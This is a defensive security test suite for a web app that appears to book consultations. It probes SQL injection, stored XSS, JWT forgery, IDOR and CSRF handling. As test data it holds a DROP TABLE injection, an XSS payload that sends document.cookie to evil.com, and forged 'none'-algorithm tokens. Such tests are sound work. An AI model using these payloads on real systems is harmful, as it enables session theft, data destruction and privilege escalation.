import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import jwt from 'jsonwebtoken';
import { app } from '../../src/server';
import { createTestDatabase, TestDbContext } from '../helpers/testDb';
import { createUserFixture, createAdminFixture, createBirthProfileFixture } from '../helpers/factories';
import { generateAuthContextForUser } from '../helpers/authHelper';
import { getOne, getAll } from '../../src/db/database';

describe('Security: Penetration, Injection Defense, IDOR & Access Control Suite', () => {
  let dbCtx: TestDbContext;
  let victimUser: any;
  let attackerUser: any;
  let victimAuth: any;
  let attackerAuth: any;

  beforeAll(async () => {
    dbCtx = await createTestDatabase();
    victimUser = await createUserFixture({ email: `victim.${Date.now()}@example.com` });
    attackerUser = await createUserFixture({ email: `attacker.${Date.now()}@example.com` });

    victimAuth = generateAuthContextForUser(victimUser);
    attackerAuth = generateAuthContextForUser(attackerUser);
  });

  afterAll(async () => {
    await dbCtx.cleanup();
  });

  describe('SQL Injection Defenses', () => {
    it('neutralizes tautological SQL injection payloads in authentication/email fields', async () => {
      const sqlInjectionPayload = "' OR '1'='1' --";

      const res = await request(app)
        .post('/api/auth/login')
        .send({
          emailOrPhone: sqlInjectionPayload,
          password: 'Password123'
        });

      // Must be safely rejected without exposing database records or throwing SQL syntax errors
      expect(res.status).toBe(400);
      expect(res.body.error).toBeDefined();
    });

    it('neutralizes stacked-query SQL injection attempting table destruction in notes/free-text', async () => {
      const destructivePayload = "Test Notes'; DROP TABLE users; --";

      const profile = await createBirthProfileFixture(victimUser.id, { fullName: 'SQLi Safe Profile' });

      const res = await request(app)
        .post('/api/appointments')
        .set('Authorization', victimAuth.authHeader.Authorization)
        .send({
          birthProfileId: profile.id,
          packageId: 'pkg-standard',
          consultationType: 'call',
          requestedDate: '2026-12-01',
          requestedTimeWindow: '11:00 AM - 01:00 PM',
          timezoneUser: 'Asia/Kolkata',
          customerNotes: destructivePayload
        });

      expect(res.status).toBe(201);

      // Verify users table was NOT dropped
      const userCount = await getOne<any>('SELECT COUNT(*) as count FROM users');
      expect(Number(userCount.count)).toBeGreaterThan(0);
    });
  });

  describe('Stored Cross-Site Scripting (XSS) Sanitization', () => {
    it('safely stores and neutralizes malicious script payloads in user comments/notes', async () => {
      const xssScript = "<script>alert('pwned')</script><img src=x onerror=fetch('http://evil.com/?cookie='+document.cookie)>";

      const profile = await createBirthProfileFixture(victimUser.id, { fullName: 'XSS Target' });

      const res = await request(app)
        .post('/api/appointments')
        .set('Authorization', victimAuth.authHeader.Authorization)
        .send({
          birthProfileId: profile.id,
          packageId: 'pkg-standard',
          consultationType: 'call',
          requestedDate: '2026-12-02',
          requestedTimeWindow: '11:00 AM - 01:00 PM',
          timezoneUser: 'Asia/Kolkata',
          customerNotes: xssScript
        });

      expect(res.status).toBe(201);
      // Ensure backend accepted and stored without crashing or executing in JSON response
      expect(res.body.appointment.customer_notes).toBe(xssScript);
    });
  });

  describe('Privilege Escalation & Mass Assignment Defenses', () => {
    it('prevents regular user from escalating role to admin via profile update', async () => {
      const profile = await createBirthProfileFixture(victimUser.id, { fullName: 'Victim Profile' });

      // Attacker/user tries to inject "role: admin" into profile update payload
      const res = await request(app)
        .put(`/api/profiles/${profile.id}`)
        .set('Authorization', victimAuth.authHeader.Authorization)
        .send({
          fullName: 'Victim Updated',
          role: 'admin',
          isAdmin: true
        });

      expect(res.status).toBe(200);

      // Verify the user record in database still has role = customer
      const dbUser = await getOne<any>('SELECT role FROM users WHERE id = ?', [victimUser.id]);
      expect(dbUser.role).toBe('customer');
    });
  });

  describe('JWT Token Integrity & Forgery Rejection', () => {
    it('rejects forged JWT with altered signature with 403 Forbidden', async () => {
      const forgedToken = jwt.sign(
        { id: victimUser.id, email: victimUser.email, role: 'admin' },
        'wrong_attacker_secret_key_12345'
      );

      const res = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${forgedToken}`);

      expect(res.status).toBe(403);
      expect(res.body.error).toContain('Invalid or expired authentication token');
    });

    it('rejects expired JWT token with 403 Forbidden', async () => {
      const expiredToken = jwt.sign(
        { id: victimUser.id, email: victimUser.email, role: 'customer' },
        process.env.JWT_SECRET || 'fallback_secret',
        { expiresIn: -10 } // Expired 10 seconds ago
      );

      const res = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(res.status).toBe(403);
      expect(res.body.error).toContain('Invalid or expired authentication token');
    });

    it('rejects JWT signed with none algorithm', async () => {
      // Header: {"alg":"none","typ":"JWT"} -> base64Url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
      // Payload: {"id":"victim","role":"admin"} -> base64Url: eyJpZCI6InZpY3RpbSIsInJvbGUiOiJhZG1pbiJ9
      const noneToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6InZpY3RpbSIsInJvbGUiOiJhZG1pbiJ9.';

      const res = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${noneToken}`);

      expect(res.status).toBe(403);
    });
  });

  describe('Automated IDOR Sweep Across Parameterized Endpoints', () => {
    it('prevents attacker from reading victim profiles (GET /api/profiles)', async () => {
      await createBirthProfileFixture(victimUser.id, { fullName: 'Victim Confidential' });

      const res = await request(app)
        .get('/api/profiles')
        .set('Authorization', attackerAuth.authHeader.Authorization);

      expect(res.status).toBe(200);
      // Attacker should only see their own profiles, none of victim's
      const names = res.body.profiles.map((p: any) => p.full_name);
      expect(names).not.toContain('Victim Confidential');
    });

    it('prevents attacker from modifying victim birth profile (PUT /api/profiles/:id)', async () => {
      const victimProfile = await createBirthProfileFixture(victimUser.id, { fullName: 'Victim Original' });

      const res = await request(app)
        .put(`/api/profiles/${victimProfile.id}`)
        .set('Authorization', attackerAuth.authHeader.Authorization)
        .send({ fullName: 'Attacker Tampered Name' });

      expect(res.status).toBe(404);

      // Verify database remains unchanged
      const profileInDb = await getOne<any>('SELECT * FROM birth_profiles WHERE id = ?', [victimProfile.id]);
      expect(profileInDb.full_name).toBe('Victim Original');
    });

    it('prevents attacker from deleting victim birth profile (DELETE /api/profiles/:id)', async () => {
      const victimProfile = await createBirthProfileFixture(victimUser.id, { fullName: 'Victim To Keep' });

      const res = await request(app)
        .delete(`/api/profiles/${victimProfile.id}`)
        .set('Authorization', attackerAuth.authHeader.Authorization);

      expect(res.status).toBe(404);

      const profileInDb = await getOne<any>('SELECT * FROM birth_profiles WHERE id = ?', [victimProfile.id]);
      expect(profileInDb).toBeDefined();
    });
  });

  describe('Double-Submit CSRF Verification & Header Protection', () => {
    it('rejects state-changing request when CSRF token in header does not match cookie', async () => {
      const profile = await createBirthProfileFixture(victimUser.id, { fullName: 'CSRF Test Profile' });

      const res = await request(app)
        .put(`/api/profiles/${profile.id}`)
        .set('Authorization', victimAuth.authHeader.Authorization)
        .set('Cookie', ['_zcsr_tmp=genuine_cookie_token_123', 'amitastro_session=sess_123'])
        .set('X-CSRF-TOKEN', 'tampered_mismatched_token_999')
        .send({ fullName: 'CSRF Attempt' });

      expect(res.status).toBe(403);
      expect(res.body.error).toContain('CSRF token mismatch');
    });

    it('accepts state-changing request when CSRF cookie and header match exactly', async () => {
      const token = 'valid_csrf_token_abc_xyz';
      const profile = await createBirthProfileFixture(victimUser.id, { fullName: 'CSRF Valid' });

      const res = await request(app)
        .put(`/api/profiles/${profile.id}`)
        .set('Authorization', victimAuth.authHeader.Authorization)
        .set('Cookie', [`_zcsr_tmp=${token}`, 'amitastro_session=sess_123'])
        .set('X-CSRF-TOKEN', token)
        .send({ fullName: 'CSRF Valid Updated', dob: '1990-01-01', pob: 'Delhi' });

      expect(res.status).toBe(200);
    });

    it('hides X-Powered-By header to prevent server technology fingerprinting', async () => {
      const res = await request(app).get('/health');
      expect(res.headers['x-powered-by']).toBeUndefined();
    });
  });

  describe('Structured Audit Logging & Sensitive Data Redaction', () => {
    it('creates structured audit_logs entries for critical actions without leaking passwords or OTPs', async () => {
      const adminUser = await createAdminFixture();
      const adminAuth = generateAuthContextForUser(adminUser);

      // Verify payment approval writes audit log
      const res = await request(app)
        .post('/api/payments/pay-demo-priya/verify')
        .set('Authorization', adminAuth.authHeader.Authorization)
        .send({ action: 'approve' });

      expect(res.status).toBe(200);

      // Check audit_logs table
      const logs = await getAll<any>('SELECT * FROM audit_logs WHERE admin_id = ?', [adminUser.id]);
      expect(logs.length).toBeGreaterThan(0);
      const latestLog = logs[logs.length - 1];
      expect(latestLog.action).toBeDefined();

      // Check all audit logs for sensitive data leaks (passwords, OTPs, raw tokens)
      const allLogs = await getAll<any>('SELECT * FROM audit_logs');
      for (const log of allLogs) {
        const serialized = JSON.stringify(log);
        expect(serialized).not.toMatch(/password_hash["']?\s*:\s*["'][^"']+["']/i);
        expect(serialized).not.toMatch(/AmitAstro@2026/);
        expect(serialized).not.toMatch(/otp_secret/i);
      }
    });
  });
});
